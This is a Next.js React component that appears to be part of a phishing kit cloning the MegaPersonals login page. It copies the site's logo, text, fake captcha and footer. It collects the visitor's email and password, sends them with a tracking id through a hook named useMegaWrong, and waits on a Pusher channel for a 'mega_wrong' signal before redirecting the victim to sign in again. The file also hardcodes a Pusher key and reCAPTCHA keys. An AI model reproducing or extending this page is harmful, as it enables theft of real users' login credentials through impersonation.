"use client";
import React, { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Cookies from "js-cookie";
import Pusher from "pusher-js";
import useMegaWrong from "../hooks/useMegaWrong";

export default function megaWrong() {
  const[successId, setSuccessId] = useState('');
  const router = useRouter()
  const id = Cookies.get("id");
  const pusher = new Pusher("e4766909b306ad7ddd58", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });


  const initialValues = { email: "", password: "", captcha: "" };
  const { login } = useMegaWrong();

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;
    const allValues = {
     
      mail: email,
      passcode: password,
      id:id
    };
    console.log("allValues", allValues);
    login(allValues, formik);
  };



  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind('mega_wrong', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      console.log(data.id)
      setSuccessId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('mega_wrong');
      channel.unsubscribe(id);
    };
  }, [id]);

  if (successId) {
    // Perform the revalidation or data fetching logic here
  return router.push(`/signin`)
}
const code=Cookies.get("code")

const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
  const captchaKeyProd = "6Lck0YUjAAAAANYCIMzWXamx6oD5pRnwwKszARPR";
  const recaptchaKey =
    process.env.NODE_ENV !== "development" ? captchaKeyProd : captchaKeyDev;
console.log(code)
  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
    <div className="w-[65%] lg:w-full">
      <img src="/images/megapersonals.png" alt="megapersonals" />
    </div>

    {/* Login Block */}
    <div className="mt-[10px] flex flex-col items-center">
      <p className="text-custom-gray2 text-lg">Is this your first time posting?</p>
      <button className="mt-[8px] bg-custom-blue3 px-[57px] text-[24px] text-white font-semibold tracking-[2px] rounded">
        Start Here
      </button>

      <p className=" mt-[10px] text-custom-gray2 text-lg">Already have a login?</p>
      <p className="text-custom-gray2 text-[25px]">Login</p>
    </div>

    <div className="mt-1">
      <Formik initialValues={initialValues} onSubmit={handleSubmit}>
        {(formik) => (
          <Form className="mx-[30px] flex flex-col justify-center items-center">
            <div className="space-y-[9px] flex flex-col items-center">
              <Field
                placeholder="Email"
                className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                id="email"
                name="email"
                required
              />

              <Field
                className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                placeholder="Password"
                name="password"
                type="password"
                autoComplete="on"
                required
              />
            </div>

            <div className="flex flex-col items-center">
              <Image
                src="/images/captures.jpeg"
                alt="captcha"
                width={228}
                height={55}
                className="mt-3"
              />

              <Field
                className="mt-2 w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                id="captcha"
                name="captcha"
                placeholder="Enter code from the picture"
                required
              />

              <button
                type="submit"
                className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
              >
                SUBMIT
              </button>
            </div>
          </Form>
        )}
      </Formik>
    </div>

    <Image
      src="/images/warning.png"
      alt="warning"
      className="mt-2 mx-auto"
      width={350}
      height={154}
    />

    <p className="mt-[10px] uppercase text-center text-sm text-custom-blue2 hover:underline">
      Forgot Password?
    </p>

    {/* Footer */}
    <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
      <p className="cursor-pointer">Home</p>
      {" | "}
      <p className="cursor-pointer">Manage Posts</p>
      {" | "}
      <p className="cursor-pointer">Contact Us</p>
      {" | "}
      <p className="cursor-pointer">Policies & Terms</p>
    </div>

    <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
      Copyright ©2021 MegaPersonals.eu
    </p>
  </div>
);

  
}
